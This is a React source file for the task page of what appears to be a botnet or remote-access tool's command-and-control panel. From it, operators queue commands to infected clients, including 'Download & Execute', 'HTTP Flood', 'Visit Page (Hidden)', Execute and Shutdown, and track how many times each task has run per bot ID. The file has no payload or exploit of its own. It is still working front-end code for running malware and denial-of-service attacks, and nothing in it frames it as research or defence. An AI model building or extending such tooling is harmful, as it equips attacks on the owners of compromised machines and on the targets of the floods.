"use client";
import React, { useState } from "react";
import { useTaskStore } from "@/lib/realtimeStore";
import DataTable from "@/components/DataTable";
import HackerToast, { showHackerToast } from "@/components/HackerToast";

import LoadingSkeleton from "@/components/LoadingSkeleton";
import GridListToggle from "@/components/GridListToggle";

import { useSocketRealtime } from '@/lib/realtimeStore';

export default function TasksPage() {
  useSocketRealtime();
  const tasks = Object.values(useTaskStore((s) => s.tasks) || {});
  const [search, setSearch] = useState("");
  const [clientFilter, setClientFilter] = useState("");
  const [statusFilter, setStatusFilter] = useState("");
  const [taskType, setTaskType] = useState("MessageBox");
  const [params, setParams] = useState("");
  const [submitting, setSubmitting] = useState(false);

  if (!tasks) return <LoadingSkeleton className="h-32 w-full" />;

  // Unique client IDs and statuses
  const clientIds = Array.from(new Set(tasks.map((t: any) => t.clientId)));
  const statuses = Array.from(new Set(tasks.map((t: any) => t.status).filter(Boolean)));

  // Filtered tasks
  const filteredTasks = tasks.filter((task: any) => {
    const matchesSearch =
      search === "" ||
      (task.command && String(task.command).toLowerCase().includes(search.toLowerCase())) ||
      (task.output && String(task.output).toLowerCase().includes(search.toLowerCase()));
    const matchesClient = clientFilter === "" || task.clientId === clientFilter;
    const matchesStatus = statusFilter === "" || task.status === statusFilter;
    return matchesSearch && matchesClient && matchesStatus;
  });

  // Backend actions
  const handleCreateTask = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitting(true);
    try {
      await import('@/lib/api').then(api => api.default.post('/tasks', { command: taskType, params }));
      setParams("");
      showHackerToast('Task created!', 'success');
    } catch {
      showHackerToast('Failed to create task', 'error');
    } finally {
      setSubmitting(false);
    }
  };
  const handlePause = async (task: any) => {
    showHackerToast(`Paused task ${task.id}`, 'info');
  };
  const handleComplete = async (task: any) => {
    showHackerToast(`Completed task ${task.id}`, 'success');
  };
  const handleCancel = async (task: any) => {
    showHackerToast(`Cancelled task ${task.id}`, 'error');
  };

  // Table columns
  const columns = [
    { key: "username", label: "Username", sortable: true, render: (row: any) => String(row.username || "root") },
    { key: "command", label: "Task", sortable: true, render: (row: any) => String(row.command) },
    { key: "params", label: "Params", sortable: false, render: (row: any) => String(row.params || "") },
    { key: "clientId", label: "BID", sortable: true, render: (row: any) => String(row.clientId) },
    { key: "wantedExecutions", label: "Wanted Executions", sortable: false, render: (row: any) => String(row.wantedExecutions || 1) },
    { key: "currentExecutions", label: "Current Executions", sortable: false, render: (row: any) => String(row.currentExecutions || 0) },
    { key: "createdAt", label: "Date", sortable: true, render: (row: any) => row.createdAt ? new Date(row.createdAt).toLocaleString() : "" },
    { key: "status", label: "Status", sortable: true, render: (row: any) => <StatusBadge status={row.status} /> },
    {
      key: "actions",
      label: "Actions",
      render: (row: any) => (
        <div className="flex gap-1">
          <button className="bg-blue-700 hover:bg-blue-800 text-white px-2 py-1 rounded" title="Pause" onClick={() => handlePause(row)}>⏸️</button>
          <button className="bg-yellow-500 hover:bg-yellow-600 text-black px-2 py-1 rounded" title="Complete" onClick={() => handleComplete(row)}>C</button>
          <button className="bg-red-600 hover:bg-red-700 text-white px-2 py-1 rounded" title="Cancel" onClick={() => handleCancel(row)}>X</button>
        </div>
      ),
    },
  ];

  function StatusBadge({ status }: { status?: string }) {
    if (!status) return null;
    let color = "bg-gray-800 border-gray-500 text-gray-200";
    if (status === "complete" || status === "success") color = "bg-green-900 border-green-500 text-green-200 shadow-[0_0_8px_#0f0]";
    else if (status === "canceled" || status === "failed" || status === "error") color = "bg-red-900 border-red-500 text-red-200 shadow-[0_0_8px_#f00]";
    else if (status === "pending" || status === "running") color = "bg-yellow-900 border-yellow-500 text-yellow-200 shadow-[0_0_8px_#ff0]";
    return (
      <span className={`inline-block px-2 py-0.5 border font-mono text-xs uppercase tracking-wider ${color} ml-2 animate-pulse`} style={{textShadow: '0 0 8px #0f0'}}>{status}</span>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-900 via-gray-900 to-gray-950 p-6">
      <HackerToast />
      <div className="max-w-5xl mx-auto">
        {/* Create Task Card */}
        <div className="bg-gradient-to-r from-blue-700 to-blue-900 rounded-lg shadow-lg p-6 mb-8">
          <h2 className="text-xl font-bold text-white mb-4">Create Task</h2>
          <form className="flex flex-col md:flex-row gap-4 items-center" onSubmit={handleCreateTask}>
            <select
              value={taskType}
              onChange={e => setTaskType(e.target.value)}
              className="w-full md:w-72 p-3 rounded bg-gray-900 text-white text-lg border-2 border-blue-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
            >
              {[
                "MessageBox", "Execute", "Download & Execute", "HTTP Flood", "Visit Page", "Visit Page (Hidden)", "Close", "Shutdown", "Restart", "Hibernate", "Log Off", "Abort"
              ].map(opt => (
                <option key={opt} value={opt}>{opt}</option>
              ))}
            </select>
            <input
              type="text"
              placeholder="Parameters (comma separated)"
              value={params}
              onChange={e => setParams(e.target.value)}
              className="w-full flex-1 p-3 rounded bg-gray-900 text-white text-lg border-2 border-blue-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
            <button
              className="bg-blue-600 hover:bg-blue-700 text-white font-bold px-6 py-2 rounded text-lg shadow"
              type="submit"
              disabled={submitting}
            >
              {submitting ? "Creating..." : "Create"}
            </button>
          </form>
        </div>
        {/* DataTable Controls */}
        <div className="flex flex-wrap gap-2 mb-4 items-center justify-between">
          <div className="flex gap-2">
            <button className="bg-gray-800 text-white px-3 py-1 rounded shadow">Copy</button>
            <button className="bg-gray-800 text-white px-3 py-1 rounded shadow">Excel</button>
            <button className="bg-gray-800 text-white px-3 py-1 rounded shadow">CSV</button>
            <button className="bg-gray-800 text-white px-3 py-1 rounded shadow">Print</button>
          </div>
          <input
            type="text"
            placeholder="Search tasks..."
            value={search}
            onChange={e => setSearch(e.target.value)}
            className="px-3 py-1 rounded bg-gray-900 text-white border border-blue-400 focus:outline-none"
            style={{ minWidth: 180 }}
          />
        </div>
        <DataTable columns={columns} data={filteredTasks} pageSize={10} />
      </div>
    </div>
  );
}
